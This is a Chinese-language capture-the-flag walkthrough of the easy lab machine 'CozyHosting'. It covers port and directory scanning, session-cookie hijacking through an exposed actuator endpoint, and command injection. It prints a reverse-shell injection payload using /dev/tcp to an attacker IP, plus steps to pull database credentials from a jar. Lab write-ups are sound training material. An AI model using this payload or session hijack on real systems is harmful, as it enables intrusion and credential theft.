![圖片](https://github.com/favorite986141/jamescao/assets/125249893/ca53d48d-8c3e-4d90-9c0b-5992be7d2797)CozyHosting Level:Easy
===
尋找user.txt
---
1.Nmap掃描IP，發現有開22、80

![圖片](https://github.com/favorite986141/jamescao/assets/125249893/be94bec4-7737-4fb2-8017-4f20fccf7517)

2.使用dirsearch搜尋目錄，找到/actuator/sessions，內容跟session有關

![圖片](https://github.com/favorite986141/jamescao/assets/125249893/969ec080-c913-4f63-b819-1aa035fd5303)

![圖片](https://github.com/favorite986141/jamescao/assets/125249893/a068678f-5ba5-48ce-8923-3fc98f91c180)

3.透過session cookie登入Web

![圖片](https://github.com/favorite986141/jamescao/assets/125249893/df05fe7b-4e80-4c59-b946-eb1746901947)

4.找到疑似可執行ssh，透過burpsuite抓包測試確認可以執行指令

![圖片](https://github.com/favorite986141/jamescao/assets/125249893/f05c4cc3-a6d0-4d1f-bfd4-33d3ab5bcc4e)

5.插入reverse shell取得shell

     ;`(sh)0>/dev/tcp/10.10.14.62/1234`   ;表示指令分隔符，它可以讓你在一行中連續執行多個指令。 ``反引號（backticks），表示執行包裹在其內部的命令，並將其輸出插入到命令列中。
 
![圖片](https://github.com/favorite986141/jamescao/assets/125249893/eb0de815-97af-4104-bfd9-5ccb5aea6225)

6.輸入exec >&0，它會將腳本或程式的輸出重新定向到標準輸入，這通常被用於隱藏輸出或將輸出發送到相同的地方作為輸入，以便與輸入進行互動。

![圖片](https://github.com/favorite986141/jamescao/assets/125249893/9048a526-b34b-46a3-834b-158df8333b02)

7.最後輸入script /dev/null -c bash，將輸出記錄到/dev/null就會被拋棄。這樣執行的命令不會在目標上留下任何痕跡

![圖片](https://github.com/favorite986141/jamescao/assets/125249893/1d0621b2-8094-4c44-b98c-00f323093450)

8.在當前目錄下沒有user.txt但發現有一個jar包，將jar包載下來

![圖片](https://github.com/favorite986141/jamescao/assets/125249893/bb41f8bb-e22f-433a-b1ce-b32306443242)

9.解開jar包，使用grep 找出postgres的密碼

![圖片](https://github.com/favorite986141/jamescao/assets/125249893/70c02312-0773-4199-9b55-d07483c3b52e)

![圖片](https://github.com/favorite986141/jamescao/assets/125249893/ceb7f02e-d4a9-4d8a-b0b4-df1927125c9e)

